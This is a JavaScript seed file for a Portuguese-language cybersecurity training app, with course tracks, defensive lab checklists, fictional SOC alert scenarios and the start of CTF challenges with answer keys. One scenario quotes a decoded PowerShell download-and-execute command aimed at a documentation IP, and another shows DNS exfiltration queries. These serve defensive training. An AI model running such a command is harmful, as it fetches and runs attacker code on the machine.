// seed-cyber.js
// Popula o conteúdo global do módulo Cybersecurity:
//   content/cyberTracks/items   — as 12 trilhas
//   content/cyberLessons/items  — lições de cada trilha (teoria / lab / quiz)
//   content/cyberLabs/items     — laboratórios práticos (checklist educacional)
//
// Mesmo padrão dos outros seeds: só grava se ainda não populado (flag em
// content/meta) e exige que as regras liberem escrita em content/** pro UID admin.
// Nada aqui inventa progresso — são só definições de conteúdo. O progresso do
// usuário vive em users/{uid}/cyberProgress e users/{uid}/cyberLabProgress.

import { doc, getDoc, writeBatch, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-firestore.js";
import { db } from "./firebase-config.js";

// ---------- TRILHAS ----------
// cor: hex usado só no card da trilha (validado no cliente antes de ir pro style).
const tracks = [
  { id: "fundamentos", ordem: 1, nome: "Fundamentos de Cybersecurity", icone: "🛡️", cor: "#3E6B6B", descricao: "CIA, ameaças, vetores de ataque, defesa em profundidade e postura de segurança." },
  { id: "redes-protocolos", ordem: 2, nome: "Redes e Protocolos", icone: "🌐", cor: "#4f9cf9", descricao: "TCP/IP sob a ótica de segurança: portas, handshakes, DNS, ARP e o que cada um revela." },
  { id: "linux-seg", ordem: 3, nome: "Linux para Segurança", icone: "🐧", cor: "#5B8266", descricao: "Permissões, usuários, serviços, logs e hardening de servidores Linux." },
  { id: "windows-seg", ordem: 4, nome: "Windows para Segurança", icone: "🪟", cor: "#4f9cf9", descricao: "Event Logs, contas, GPO, serviços e artefatos de investigação no Windows." },
  { id: "seg-redes", ordem: 5, nome: "Segurança de Redes", icone: "🔥", cor: "#C97B4A", descricao: "Firewall, ACL, VPN, segurança de camada 2 e segmentação." },
  { id: "soc-blueteam", ordem: 6, nome: "SOC / Blue Team", icone: "🖥️", cor: "#9b63f8", descricao: "Triagem de alertas, timeline, correlação de eventos e resposta defensiva." },
  { id: "web-security", ordem: 7, nome: "Web Security", icone: "🕸️", cor: "#e93d86", descricao: "OWASP Top 10, autenticação, sessões e cabeçalhos HTTP de segurança." },
  { id: "cloud-security", ordem: 8, nome: "Cloud Security", icone: "☁️", cor: "#4f9cf9", descricao: "Modelo de responsibilidade compartilhada, IAM, exposição de buckets e logging na nuvem." },
  { id: "resposta-incidentes", ordem: 9, nome: "Resposta a Incidentes", icone: "🚨", cor: "#ef5562", descricao: "Ciclo de IR (NIST), contenção, erradicação, recuperação e lições aprendidas." },
  { id: "criptografia", ordem: 10, nome: "Criptografia", icone: "🔐", cor: "#5B8266", descricao: "Simétrica, assimétrica, hashing, certificados e TLS na prática." },
  { id: "pentest-basico", ordem: 11, nome: "Pentest Básico (educacional)", icone: "🧪", cor: "#f1b94b", descricao: "Metodologia e reconhecimento — SOMENTE em ambientes próprios/autorizados e isolados." },
  { id: "governanca", ordem: 12, nome: "Governança e Compliance", icone: "📄", cor: "#92a6b0", descricao: "Políticas, frameworks (ISO 27001, NIST CSF), LGPD e gestão de risco." },
];

// ---------- LIÇÕES ----------
// tipo: "teoria" | "lab" | "quiz". ccnaTopicId liga a uma lição da trilha CCNA
// quando o assunto é o mesmo (evita duplicar conteúdo). labId aponta pra um
// laboratório em content/cyberLabs.
const lessons = [
  // Fundamentos
  { id: "cy-fund-01", trackId: "fundamentos", ordem: 1, nome: "A tríade CIA: confidencialidade, integridade, disponibilidade", tipo: "teoria" },
  { id: "cy-fund-02", trackId: "fundamentos", ordem: 2, nome: "Ameaça, vulnerabilidade e risco — as diferenças", tipo: "teoria" },
  { id: "cy-fund-03", trackId: "fundamentos", ordem: 3, nome: "Vetores de ataque comuns e engenharia social", tipo: "teoria" },
  { id: "cy-fund-04", trackId: "fundamentos", ordem: 4, nome: "Defesa em profundidade e o modelo de camadas", tipo: "teoria" },
  { id: "cy-fund-05", trackId: "fundamentos", ordem: 5, nome: "AAA: autenticação, autorização e accounting", tipo: "teoria", ccnaTopicId: "m38-02" },
  { id: "cy-fund-06", trackId: "fundamentos", ordem: 6, nome: "Modelos Zero Trust e menor privilégio", tipo: "teoria" },
  { id: "cy-fund-07", trackId: "fundamentos", ordem: 7, nome: "Kill chain e MITRE ATT&CK (visão geral)", tipo: "teoria" },
  { id: "cy-fund-08", trackId: "fundamentos", ordem: 8, nome: "Quiz — Fundamentos de Cybersecurity", tipo: "quiz" },

  // Redes e Protocolos
  { id: "cy-net-01", trackId: "redes-protocolos", ordem: 1, nome: "Portas, sockets e o handshake TCP visto pelo defensor", tipo: "teoria", ccnaTopicId: "m34-01" },
  { id: "cy-net-02", trackId: "redes-protocolos", ordem: 2, nome: "DNS: resolução, exfiltração e tunneling", tipo: "teoria", ccnaTopicId: "m03-04" },
  { id: "cy-net-03", trackId: "redes-protocolos", ordem: 3, nome: "ARP e ataques de camada 2 (spoofing, MITM)", tipo: "teoria", ccnaTopicId: "m09-01" },
  { id: "cy-net-04", trackId: "redes-protocolos", ordem: 4, nome: "Lab — Análise de tráfego com Wireshark", tipo: "lab", labId: "cylab-wireshark" },

  // Linux para Segurança
  { id: "cy-lin-01", trackId: "linux-seg", ordem: 1, nome: "Usuários, grupos e o modelo de permissões", tipo: "teoria" },
  { id: "cy-lin-02", trackId: "linux-seg", ordem: 2, nome: "Serviços, systemd e superfície de ataque", tipo: "teoria" },
  { id: "cy-lin-03", trackId: "linux-seg", ordem: 3, nome: "Logs do sistema: journald, /var/log e auditd", tipo: "teoria", ccnaTopicId: "m42-01" },
  { id: "cy-lin-04", trackId: "linux-seg", ordem: 4, nome: "Lab — Hardening de servidor Linux", tipo: "lab", labId: "cylab-hardening-linux" },

  // Windows para Segurança
  { id: "cy-win-01", trackId: "windows-seg", ordem: 1, nome: "Contas, SIDs e grupos privilegiados", tipo: "teoria" },
  { id: "cy-win-02", trackId: "windows-seg", ordem: 2, nome: "Windows Event Log: IDs que importam numa investigação", tipo: "teoria" },
  { id: "cy-win-03", trackId: "windows-seg", ordem: 3, nome: "Persistência e artefatos comuns no Windows", tipo: "teoria" },
  { id: "cy-win-04", trackId: "windows-seg", ordem: 4, nome: "Lab — Investigação de logs Windows", tipo: "lab", labId: "cylab-logs-windows" },

  // Segurança de Redes
  { id: "cy-sr-01", trackId: "seg-redes", ordem: 1, nome: "Firewall stateful vs stateless e políticas", tipo: "teoria" },
  { id: "cy-sr-02", trackId: "seg-redes", ordem: 2, nome: "ACLs como controle de segurança", tipo: "teoria", ccnaTopicId: "m36-02" },
  { id: "cy-sr-03", trackId: "seg-redes", ordem: 3, nome: "VPNs: IPsec, TLS e quando usar cada uma", tipo: "teoria", ccnaTopicId: "m48-02" },
  { id: "cy-sr-04", trackId: "seg-redes", ordem: 4, nome: "Segurança de camada 2: Port Security e DHCP Snooping", tipo: "teoria", ccnaTopicId: "m40-01" },

  // SOC / Blue Team
  { id: "cy-soc-01", trackId: "soc-blueteam", ordem: 1, nome: "O que é um SOC e os papéis do time (N1, N2, N3)", tipo: "teoria" },
  { id: "cy-soc-02", trackId: "soc-blueteam", ordem: 2, nome: "Tipos de alertas e severidade", tipo: "teoria" },
  { id: "cy-soc-03", trackId: "soc-blueteam", ordem: 3, nome: "Timeline, correlação e a pergunta 'o que aconteceu antes?'", tipo: "teoria" },
  { id: "cy-soc-04", trackId: "soc-blueteam", ordem: 4, nome: "Classificando um alerta: verdadeiro positivo, falso positivo, investigar", tipo: "teoria" },
  { id: "cy-soc-05", trackId: "soc-blueteam", ordem: 5, nome: "Lab — Investigação de alerta SOC (do início ao fim)", tipo: "lab", labId: "cylab-alerta-soc" },

  // Web Security
  { id: "cy-web-01", trackId: "web-security", ordem: 1, nome: "OWASP Top 10: visão geral e como pensar em cada categoria", tipo: "teoria" },
  { id: "cy-web-02", trackId: "web-security", ordem: 2, nome: "Injeção (SQLi) e por que parametrizar consultas resolve", tipo: "teoria" },
  { id: "cy-web-03", trackId: "web-security", ordem: 3, nome: "XSS, CSRF e o papel dos cabeçalhos de segurança (CSP, etc.)", tipo: "teoria" },
  { id: "cy-web-04", trackId: "web-security", ordem: 4, nome: "Autenticação, sessões e armazenamento seguro de senhas", tipo: "teoria" },

  // Cloud Security
  { id: "cy-cloud-01", trackId: "cloud-security", ordem: 1, nome: "Modelo de responsabilidade compartilhada", tipo: "teoria" },
  { id: "cy-cloud-02", trackId: "cloud-security", ordem: 2, nome: "IAM na nuvem: papéis, políticas e menor privilégio", tipo: "teoria" },
  { id: "cy-cloud-03", trackId: "cloud-security", ordem: 3, nome: "Exposição acidental: buckets públicos e metadados", tipo: "teoria" },
  { id: "cy-cloud-04", trackId: "cloud-security", ordem: 4, nome: "Logging e trilhas de auditoria (CloudTrail e equivalentes)", tipo: "teoria" },

  // Resposta a Incidentes
  { id: "cy-ir-01", trackId: "resposta-incidentes", ordem: 1, nome: "O ciclo de resposta a incidentes (NIST 800-61)", tipo: "teoria" },
  { id: "cy-ir-02", trackId: "resposta-incidentes", ordem: 2, nome: "Contenção: curto prazo vs longo prazo", tipo: "teoria" },
  { id: "cy-ir-03", trackId: "resposta-incidentes", ordem: 3, nome: "Coleta de evidências e cadeia de custódia", tipo: "teoria" },
  { id: "cy-ir-04", trackId: "resposta-incidentes", ordem: 4, nome: "Post-mortem sem culpa e lições aprendidas", tipo: "teoria" },

  // Criptografia
  { id: "cy-crypto-01", trackId: "criptografia", ordem: 1, nome: "Simétrica vs assimétrica: para que serve cada uma", tipo: "teoria" },
  { id: "cy-crypto-02", trackId: "criptografia", ordem: 2, nome: "Funções de hash e onde NÃO usar hash", tipo: "teoria" },
  { id: "cy-crypto-03", trackId: "criptografia", ordem: 3, nome: "Certificados, cadeia de confiança e PKI", tipo: "teoria" },
  { id: "cy-crypto-04", trackId: "criptografia", ordem: 4, nome: "TLS: o handshake e o que ele garante", tipo: "teoria" },

  // Pentest Básico (educacional)
  { id: "cy-pt-01", trackId: "pentest-basico", ordem: 1, nome: "Ética, escopo e autorização — a regra número um", tipo: "teoria" },
  { id: "cy-pt-02", trackId: "pentest-basico", ordem: 2, nome: "Metodologia: recon, enumeração, exploração, pós-exploração", tipo: "teoria" },
  { id: "cy-pt-03", trackId: "pentest-basico", ordem: 3, nome: "Reconhecimento passivo vs ativo (em ambiente próprio)", tipo: "teoria" },
  { id: "cy-pt-04", trackId: "pentest-basico", ordem: 4, nome: "Relatório de pentest: o entregável que importa", tipo: "teoria" },

  // Governança e Compliance
  { id: "cy-gov-01", trackId: "governanca", ordem: 1, nome: "Política, norma, procedimento e diretriz", tipo: "teoria" },
  { id: "cy-gov-02", trackId: "governanca", ordem: 2, nome: "Frameworks: ISO 27001 e NIST CSF", tipo: "teoria" },
  { id: "cy-gov-03", trackId: "governanca", ordem: 3, nome: "LGPD: princípios e bases legais", tipo: "teoria" },
  { id: "cy-gov-04", trackId: "governanca", ordem: 4, nome: "Gestão de risco: identificar, avaliar, tratar, monitorar", tipo: "teoria" },
];

// ---------- LABORATÓRIOS ----------
const labs = [
  {
    id: "cylab-wireshark", trackId: "redes-protocolos", nome: "Análise de tráfego com Wireshark",
    descricao: "Abra uma captura de exemplo e localize indícios de atividade suspeita.",
    dificuldade: "intermediario", tempoMin: 40, ferramenta: "Wireshark",
    ambiente: "Captura .pcap de exemplo — nenhum tráfego real é capturado pelo app.",
    checklist: [
      "Aplicar um filtro de exibição por protocolo (ex.: dns, http, tcp.flags.syn==1)",
      "Seguir o fluxo TCP de uma conversa suspeita (Follow > TCP Stream)",
      "Identificar o host de origem e o de destino do evento",
      "Registrar a conclusão: o que a captura indica e o que faltaria confirmar",
    ],
  },
  {
    id: "cylab-logs-windows", trackId: "windows-seg", nome: "Investigação de logs Windows",
    descricao: "Percorra um conjunto de eventos e reconstrua o que aconteceu numa conta.",
    dificuldade: "intermediario", tempoMin: 35, ferramenta: "Event Viewer / logs de exemplo",
    ambiente: "Logs de exemplo fornecidos pelo lab — não lê o Windows do usuário.",
    checklist: [
      "Localizar as tentativas de logon falhas (Event ID 4625) e o horário",
      "Encontrar o logon bem-sucedido que veio depois (Event ID 4624) e o tipo de logon",
      "Verificar se houve criação de conta ou mudança de grupo (4720 / 4728 / 4732)",
      "Classificar: verdadeiro positivo, falso positivo ou necessita investigação",
    ],
  },
  {
    id: "cylab-hardening-linux", trackId: "linux-seg", nome: "Hardening de servidor Linux",
    descricao: "Aplique um checklist de boas práticas num servidor de laboratório.",
    dificuldade: "basico", tempoMin: 30, ferramenta: "Shell em VM de laboratório",
    ambiente: "Executar somente numa VM/servidor próprio de laboratório.",
    checklist: [
      "Desabilitar login de root por SSH e exigir chave (PermitRootLogin no / autenticação por chave)",
      "Revisar serviços em escuta (ss -tulpn) e desligar o que não é necessário",
      "Configurar um firewall de host (ufw/nftables) com política default deny",
      "Garantir que os logs de autenticação estão sendo gravados e rotacionados",
    ],
  },
  {
    id: "cylab-hardening-windows", trackId: "windows-seg", nome: "Hardening de Windows",
    descricao: "Reforce contas, serviços e políticas de auditoria numa máquina de laboratório.",
    dificuldade: "intermediario", tempoMin: 35, ferramenta: "Windows de laboratório",
    ambiente: "Executar somente numa máquina Windows própria de laboratório.",
    checklist: [
      "Renomear/desativar a conta Administrador local e revisar o grupo Administradores",
      "Ativar a política de auditoria para logon, gestão de contas e alterações de política",
      "Revisar tarefas agendadas e serviços com início automático",
      "Habilitar o firewall do Windows nos três perfis",
    ],
  },
  {
    id: "cylab-firewall", trackId: "seg-redes", nome: "Regras de firewall e ACL",
    descricao: "Escreva e valide uma política de filtragem para um cenário dado.",
    dificuldade: "basico", tempoMin: 25, ferramenta: "Simulador de ACL do CCNA Study OS",
    ambiente: "Simulador interno — nenhuma regra é aplicada a equipamento real.",
    checklist: [
      "Definir o objetivo da política (o que permitir, o que negar)",
      "Escrever as regras da mais específica para a mais genérica",
      "Confirmar a posição de aplicação (entrada vs saída, perto da origem vs destino)",
      "Testar casos que devem passar e casos que devem ser bloqueados",
    ],
  },
  {
    id: "cylab-dns", trackId: "redes-protocolos", nome: "Análise de DNS",
    descricao: "Investigue consultas de DNS de exemplo em busca de padrões anômalos.",
    dificuldade: "intermediario", tempoMin: 30, ferramenta: "Logs de DNS de exemplo",
    ambiente: "Conjunto de consultas de exemplo — não faz resolução real em massa.",
    checklist: [
      "Separar consultas legítimas de padrões suspeitos (subdomínios longos, alta frequência)",
      "Identificar possíveis indícios de tunneling ou exfiltração",
      "Correlacionar o host que originou as consultas com outros eventos",
      "Registrar a hipótese e o próximo passo de verificação",
    ],
  },
  {
    id: "cylab-auth", trackId: "windows-seg", nome: "Análise de autenticação",
    descricao: "Reconstrua uma sequência de eventos de autenticação e classifique o resultado.",
    dificuldade: "basico", tempoMin: 25, ferramenta: "Logs de autenticação de exemplo",
    ambiente: "Logs de exemplo do lab.",
    checklist: [
      "Contar tentativas falhas e o intervalo entre elas",
      "Verificar se o sucesso veio da mesma origem das falhas",
      "Checar o horário contra o padrão normal do usuário",
      "Classificar: força bruta, senha esquecida ou acesso legítimo",
    ],
  },
  {
    id: "cylab-alerta-soc", trackId: "soc-blueteam", nome: "Investigação de alerta SOC",
    descricao: "Um alerta chegou. Analise as evidências, monte a timeline e feche o ticket.",
    dificuldade: "avancado", tempoMin: 50, ferramenta: "SOC Lab do CCNA Study OS (Fase 2)",
    ambiente: "Cenário e logs 100% fictícios, IPs de documentação (RFC 5737).",
    checklist: [
      "Ler o alerta e listar as evidências disponíveis",
      "Montar a linha do tempo dos eventos",
      "Identificar origem, destino e ação",
      "Classificar o alerta e escrever a conclusão com a justificativa",
    ],
  },
  {
    id: "cylab-siem", trackId: "soc-blueteam", nome: "Playground SIEM",
    descricao: "Receba um lote de logs e construa filtros e consultas para achar o evento-chave.",
    dificuldade: "intermediario", tempoMin: 40, ferramenta: "Playground SIEM (Fase 3)",
    ambiente: "Logs fictícios — não conecta a nenhum SIEM corporativo.",
    checklist: [
      "Entender o schema dos eventos (campos disponíveis)",
      "Escrever um filtro que isole a janela de tempo do incidente",
      "Agrupar por host/usuário para achar o outlier",
      "Salvar a consulta e descrever o achado",
    ],
  },
  {
    id: "cylab-ssh", trackId: "seg-redes", nome: "SSH seguro", ccnaTopicId: "m06-02",
    descricao: "Configure acesso remoto seguro num equipamento de laboratório.",
    dificuldade: "basico", tempoMin: 20, ferramenta: "Simulador CLI do CCNA Study OS",
    ambiente: "Simulador interno.",
    checklist: [
      "Definir hostname e domain-name e gerar o par de chaves RSA",
      "Criar usuário local com senha forte (secret)",
      "Restringir as linhas VTY a 'transport input ssh'",
      "Validar que Telnet foi recusado",
    ],
  },
  {
    id: "cylab-syslog", trackId: "linux-seg", nome: "Centralização de logs (Syslog)", ccnaTopicId: "m42-01",
    descricao: "Envie logs de um dispositivo para um coletor central de laboratório.",
    dificuldade: "basico", tempoMin: 20, ferramenta: "Simulador CLI / lab",
    ambiente: "Ambiente de laboratório próprio.",
    checklist: [
      "Ativar timestamps com data/hora nos logs",
      "Apontar o dispositivo para o coletor Syslog (logging host)",
      "Escolher o nível de severidade a enviar (logging trap)",
      "Confirmar que os eventos chegam no coletor",
    ],
  },
  {
    id: "cylab-l2", trackId: "seg-redes", nome: "Segurança de camada 2", ccnaTopicId: "m41-01",
    descricao: "Proteja o acesso de borda contra abusos comuns de L2.",
    dificuldade: "intermediario", tempoMin: 30, ferramenta: "Simulador CLI do CCNA Study OS",
    ambiente: "Simulador interno.",
    checklist: [
      "Habilitar Port Security com aprendizado sticky nas portas de acesso",
      "Definir o modo de violação adequado ao cenário",
      "Habilitar DHCP Snooping na VLAN e marcar só o uplink como trusted",
      "Habilitar Dynamic ARP Inspection apoiada no DHCP Snooping",
    ],
  },
];

// ---------- SOC LAB — CENÁRIOS DE ALERTA (Fase 2) ----------
// 100% fictício e educacional. IPs de origem/destino externos usam as faixas
// reservadas para documentação (RFC 5737: 192.0.2.0/24, 198.51.100.0/24,
// 203.0.113.0/24). Hostnames e IPs internos são de laboratório. Nada aqui
// aponta pra infraestrutura real.
//
// classificacaoCorreta: "vp" (verdadeiro positivo) | "fp" (falso positivo) |
// "investigar" (necessita mais dados antes de classificar).
const socScenarios = [
  {
    id: "soc-0027", codigo: "SOC-0027", severidade: "alto", categoria: "Autenticação",
    titulo: "Múltiplas falhas de login seguidas de sucesso",
    origem: "198.51.100.23", destino: "SRV-AD01 (10.20.0.10)",
    resumo: "Detectadas 14 tentativas de logon falhas contra várias contas em 3 minutos, a partir de um IP externo, seguidas de um logon bem-sucedido.",
    contexto: "Fora do horário comercial (03:12 local). O IP de origem nunca apareceu nos logs antes. As contas-alvo incluem contas de serviço e um administrador júnior.",
    timeline: [
      { hora: "03:12:04", evento: "4625 Falha de logon", detalhe: "conta: svc-backup · origem: 198.51.100.23 · motivo: senha incorreta" },
      { hora: "03:12:09", evento: "4625 Falha de logon", detalhe: "conta: jdoe · origem: 198.51.100.23" },
      { hora: "03:12:55", evento: "4625 Falha de logon (x11)", detalhe: "contas variadas · mesma origem · uma tentativa por conta" },
      { hora: "03:15:41", evento: "4624 Logon bem-sucedido", detalhe: "conta: t.helpdesk · tipo 3 (rede) · origem: 198.51.100.23" },
      { hora: "03:16:20", evento: "4672 Privilégios especiais atribuídos", detalhe: "conta: t.helpdesk" },
    ],
    evidencias: [
      "Uma tentativa por conta, muitas contas: padrão de password spraying (não força bruta numa conta só).",
      "IP de origem sem histórico e geolocalização fora do país de operação.",
      "O sucesso veio na mesma origem das falhas, minutos depois.",
      "t.helpdesk não costuma logar por rede às 03h.",
    ],
    perguntasGuia: [
      "O padrão é força bruta numa conta ou spraying em várias?",
      "A origem do sucesso é a mesma das falhas?",
      "O horário e o tipo de logon batem com o comportamento normal da conta?",
    ],
    classificacaoCorreta: "vp",
    explicacao: "Verdadeiro positivo. O conjunto — spraying de um IP externo desconhecido, fora do horário, culminando num logon bem-sucedido da mesma origem e atribuição de privilégios — descreve um comprometimento de credencial em andamento. Ações: desabilitar t.helpdesk, forçar reset, isolar a sessão, revisar o que a conta acessou após 03:15 e bloquear o IP de origem.",
  },
  {
    id: "soc-0031", codigo: "SOC-0031", severidade: "medio", categoria: "Rede",
    titulo: "Varredura de portas contra sub-rede interna",
    origem: "192.0.2.50 (VULN-SCAN01)", destino: "10.20.0.0/24",
    resumo: "Um host disparou conexões SYN para centenas de portas em dezenas de máquinas da VLAN de servidores, em poucos minutos.",
    contexto: "O host de origem é o VULN-SCAN01, servidor de varredura de vulnerabilidades da própria equipe de segurança. Existe uma janela de varredura autorizada toda quarta-feira, 02:00–04:00. O evento ocorreu quarta, 02:37.",
    timeline: [
      { hora: "02:37:10", evento: "Firewall: muitos SYN", detalhe: "origem 192.0.2.50 · destinos 10.20.0.5–10.20.0.60 · portas 1–1024" },
      { hora: "02:41:52", evento: "IDS: assinatura port-scan", detalhe: "TCP connect scan · origem 192.0.2.50" },
      { hora: "03:55:00", evento: "Varredura encerrada", detalhe: "origem 192.0.2.50 para de enviar" },
    ],
    evidencias: [
      "Origem = servidor de varredura conhecido e documentado da equipe.",
      "Horário dentro da janela autorizada (quarta 02:00–04:00).",
      "Nenhuma exploração ou payload — só enumeração TCP.",
      "Change/registro de varredura existe no calendário da equipe.",
    ],
    perguntasGuia: [
      "A origem é um ativo conhecido e autorizado?",
      "O horário cai numa janela de manutenção/varredura documentada?",
      "Houve alguma ação além de enumeração?",
    ],
    classificacaoCorreta: "fp",
    explicacao: "Falso positivo. É a varredura autorizada da própria equipe de segurança, dentro da janela documentada, sem exploração. Ação: suprimir/ajustar o alerta para a origem e janela conhecidas (allowlist com data de revisão), mantendo o alerta ativo para varreduras fora da janela ou de outras origens.",
  },
  {
    id: "soc-0033", codigo: "SOC-0033", severidade: "critico", categoria: "Execução",
    titulo: "PowerShell codificado iniciado por conta comum",
    origem: "WKS-3412 (10.30.5.12)", destino: "203.0.113.77",
    resumo: "Um processo powershell.exe foi iniciado com o parâmetro -EncodedCommand por uma conta de usuário sem função técnica, e em seguida abriu conexão de saída para um IP externo.",
    contexto: "O usuário m.silva trabalha no financeiro. A estação nunca executou PowerShell administrativo antes. O comando decodificado baixa e executa um script de um host remoto.",
    timeline: [
      { hora: "14:02:11", evento: "Processo criado", detalhe: "powershell.exe -nop -w hidden -EncodedCommand <base64> · pai: winword.exe · usuário: m.silva" },
      { hora: "14:02:12", evento: "Base64 decodificado (pelo EDR)", detalhe: "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.77/a')" },
      { hora: "14:02:13", evento: "Conexão de saída", detalhe: "10.30.5.12 → 203.0.113.77:80" },
      { hora: "14:02:40", evento: "Nova tarefa agendada", detalhe: "cria persistência: executa a cada logon" },
    ],
    evidencias: [
      "PowerShell oculto e codificado iniciado a partir do Word (macro).",
      "Comando decodificado baixa e executa código remoto (download cradle).",
      "Conexão imediata para IP externo sem reputação.",
      "Criação de tarefa agendada = tentativa de persistência.",
      "Comportamento totalmente atípico para a conta e a estação.",
    ],
    perguntasGuia: [
      "Qual processo iniciou o PowerShell? O que o comando faz depois de decodificado?",
      "Houve conexão de saída ou tentativa de persistência?",
      "Isso é compatível com a função do usuário e o histórico da máquina?",
    ],
    classificacaoCorreta: "vp",
    explicacao: "Verdadeiro positivo. Word → PowerShell oculto/codificado → download cradle → C2 → persistência é uma cadeia de execução maliciosa clássica (provável phishing com macro). Ações: isolar WKS-3412 da rede, matar o processo e a tarefa agendada, coletar o anexo/e-mail, bloquear 203.0.113.77, resetar as credenciais de m.silva e caçar o mesmo IOC no resto do parque.",
  },
  {
    id: "soc-0035", codigo: "SOC-0035", severidade: "alto", categoria: "Exfiltração",
    titulo: "Volume anômalo de consultas DNS TXT",
    origem: "WKS-2201 (10.30.4.7)", destino: "resolver interno → domínio externo",
    resumo: "Uma estação gerou milhares de consultas DNS TXT para subdomínios longos e aleatórios de um único domínio registrado há 2 dias.",
    contexto: "O domínio consultado não tem site nem reputação. As consultas são constantes (uma a cada poucos segundos) há 40 minutos. O usuário está logado e ativo.",
    timeline: [
      { hora: "10:05:00", evento: "DNS: primeira consulta TXT", detalhe: "a8f3k2...9c.exfil-lab-example.test · tipo TXT" },
      { hora: "10:05:12", evento: "DNS: consultas TXT contínuas", detalhe: "subdomínios de ~50 caracteres, base32, sempre o mesmo domínio pai" },
      { hora: "10:44:00", evento: "Ainda em andamento", detalhe: "~1.900 consultas acumuladas de WKS-2201" },
    ],
    evidencias: [
      "Subdomínios longos e aleatórios = dados codificados, não navegação normal.",
      "Domínio pai recém-registrado, sem conteúdo nem reputação.",
      "Só consultas TXT, em alta frequência e constante — padrão de canal.",
      "Ainda não há confirmação de qual processo está gerando as consultas.",
    ],
    perguntasGuia: [
      "O formato dos subdomínios parece navegação legítima ou dado codificado?",
      "Qual a idade e a reputação do domínio pai?",
      "Você já sabe qual processo/host está gerando isso?",
    ],
    classificacaoCorreta: "investigar",
    explicacao: "Necessita investigação (com forte suspeita de exfiltração/tunneling por DNS). O padrão é altamente suspeito, mas antes de classificar como verdadeiro positivo falta: identificar o processo de origem na estação, confirmar se há dado saindo (tamanho/entropia do payload) e descartar software legítimo mal-comportado. Enquanto isso: conter a estação por precaução e bloquear o domínio no resolver.",
  },
  {
    id: "soc-0038", codigo: "SOC-0038", severidade: "baixo", categoria: "Firewall",
    titulo: "Conexão de saída bloqueada pela política",
    origem: "SRV-APP07 (10.20.3.7)", destino: "203.0.113.200:8443",
    resumo: "O firewall registrou e bloqueou uma tentativa de conexão de saída de um servidor de aplicação para um IP externo numa porta alta.",
    contexto: "Política de egress do segmento de servidores: só HTTP/HTTPS para destinos aprovados e DNS para o resolver interno. O destino 203.0.113.200 não está na lista de aprovados. Uma única tentativa, sem repetição, coincidindo com uma atualização de biblioteca do app que tenta telemetria.",
    timeline: [
      { hora: "16:20:03", evento: "Firewall: DENY egress", detalhe: "10.20.3.7 → 203.0.113.200:8443 · regra: default-deny egress" },
      { hora: "16:20:03", evento: "App log", detalhe: "\"telemetry endpoint unreachable, continuing\"" },
      { hora: "—", evento: "Sem novas tentativas", detalhe: "nenhuma outra conexão para o destino nas 24h seguintes" },
    ],
    evidencias: [
      "A conexão foi BLOQUEADA — a política funcionou como projetada.",
      "Uma única tentativa, correlacionada com telemetria de uma dependência do app.",
      "Nenhum sinal de comprometimento (sem processo estranho, sem persistência, sem outras conexões).",
    ],
    perguntasGuia: [
      "A conexão foi permitida ou bloqueada?",
      "Há um motivo benigno plausível e correlacionado?",
      "Existe algum outro indicador de comprometimento no host?",
    ],
    classificacaoCorreta: "fp",
    explicacao: "Falso positivo do ponto de vista de incidente de segurança. O controle funcionou: o egress foi negado. O ruído vem de uma dependência do app tentando enviar telemetria para um endpoint não aprovado. Ação: decidir com o time do app se o endpoint deve ser aprovado ou a telemetria desligada, e ajustar o alerta para não escalar bloqueios esperados dessa origem.",
  },
  {
    id: "soc-0040", codigo: "SOC-0040", severidade: "critico", categoria: "Alteração administrativa",
    titulo: "Conta adicionada a grupo de alto privilégio fora da janela",
    origem: "conta: a.junior", destino: "grupo: Domain Admins",
    resumo: "Um usuário foi adicionado ao grupo Domain Admins às 22:40, fora de qualquer janela de mudança, por uma conta que normalmente não administra o AD.",
    contexto: "Não há ticket de mudança associado. A conta que fez a alteração (a.junior) teve um logon suspeito mais cedo no mesmo dia (ver SOC-0027-like). O usuário adicionado (b.reboucas) está de férias.",
    timeline: [
      { hora: "22:38:10", evento: "4624 Logon", detalhe: "conta: a.junior · origem: WKS-9001 · tipo 10 (RDP)" },
      { hora: "22:40:02", evento: "4728 Membro adicionado a grupo global", detalhe: "grupo: Domain Admins · membro: b.reboucas · por: a.junior" },
      { hora: "22:41:30", evento: "4672 Privilégios especiais", detalhe: "conta: b.reboucas" },
      { hora: "22:43:00", evento: "Sem ticket de mudança", detalhe: "nenhuma mudança aprovada para essa janela" },
    ],
    evidencias: [
      "Mudança de grupo crítico sem ticket e fora de janela.",
      "Executada por conta que não administra o AD normalmente.",
      "O usuário adicionado está de férias (não deveria precisar de acesso).",
      "Correlaciona com atividade de credencial suspeita mais cedo no dia.",
    ],
    perguntasGuia: [
      "Existe mudança aprovada para essa alteração e janela?",
      "Quem executou a mudança costuma administrar o AD?",
      "O beneficiário da mudança tem motivo legítimo agora?",
    ],
    classificacaoCorreta: "vp",
    explicacao: "Verdadeiro positivo. Escalonamento de privilégio: alteração de grupo crítico, sem mudança aprovada, fora de janela, por conta atípica, beneficiando um usuário ausente — provável abuso de credencial comprometida para ganhar persistência com privilégio máximo. Ações: reverter a alteração, desabilitar a.junior e b.reboucas, revisar tudo que essas contas fizeram, acionar IR e resetar credenciais privilegiadas (assumir Tier 0 comprometido).",
  },
];

// ---------- DESAFIOS / CTF (Fase 3) ----------
// Educacional, sobre dados fictícios. A verificação da resposta é no cliente
// (respostas normalizadas em `respostas`) — como todo CTF client-side, quem abre
// o devtools consegue "trapacear"; aqui o objetivo é treino, não competição.
const ctfChallenges = [
  {
    id: "ctf-b64", ordem: 1, titulo: "Mensagem interceptada", categoria: "Codificação", dificuldade: "basico",
    enunciado: "Um analista capturou este payload numa requisição. Decodifique e responda com o texto em claro:\n\nRXNjdWRvIGF6dWwsIGRlZmVzYSBlbSBwcm9mdW5kaWRhZGU=",
    dica: "Só letras, números, + e / terminando com '=' costuma ser Base64.",
    respostas: ["escudo azul, defesa em profundidade", "escudo azul defesa em profundidade"],
    explicacao: "É Base64. Decodificado dá \"Escudo azul, defesa em profundidade\". Base64 não é criptografia — é só codificação; qualquer um decodifica.",
  },
  {
    id: "ctf-hash", ordem: 2, titulo: "Que hash é esse?", categoria: "Criptografia", dificuldade: "basico",
    enunciado: "Um relatório traz este valor como \"hash do arquivo\":\n\n5d41402abc4b2a76b9719d911017c592\n\nQual algoritmo produz um hash desse tamanho? (responda a sigla)",
    dica: "Conte os caracteres hexadecimais. 32 = 128 bits.",
    respostas: ["md5"],
